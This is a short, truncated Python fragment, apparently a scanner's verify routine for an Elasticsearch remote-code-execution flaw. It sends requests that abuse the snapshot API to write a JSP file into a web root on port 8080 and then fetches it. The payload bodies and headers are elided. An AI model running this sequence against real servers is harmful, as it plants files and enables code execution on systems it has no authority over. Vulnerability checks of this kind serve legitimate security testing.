...
def verify(host,proxy):
    ...
    url0 = url_handle(host) + "/yz.jsp/yz.jsp/1" # url自己按需调整
    url1 = url_handle(host) + "/_snapshot/yz.jsp"
    url2 = url_handle(host) + "/_snapshot/yz.jsp/yz.jsp"
    url3 = url_handle(host)[:-4] + "8080" + "/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=ofxelasticsearchrcetest"
    url4 = url_handle(host)[:-4] + "8080" + "/wwwroot/test.jsp"
    ...
    try:
        ...
        """
        req0 = requests.post(url0,data = data0,headers = headers , proxies = proxy ,timeout = _info["timeout"],verify = False)
        req1 = requests.put(url1,data = data1,headers = headers , proxies = proxy ,timeout = _info["timeout"],verify = False)
        req2 = requests.put(url2,data = data2,headers = headers , proxies = proxy ,timeout = _info["timeout"],verify = False)
        req3 = requests.get(url3,headers = headers , proxies = proxy ,timeout = _info["timeout"],verify = False)
        req4 = requests.get(url4,headers = headers , proxies = proxy ,timeout = _info["timeout"],verify = False)
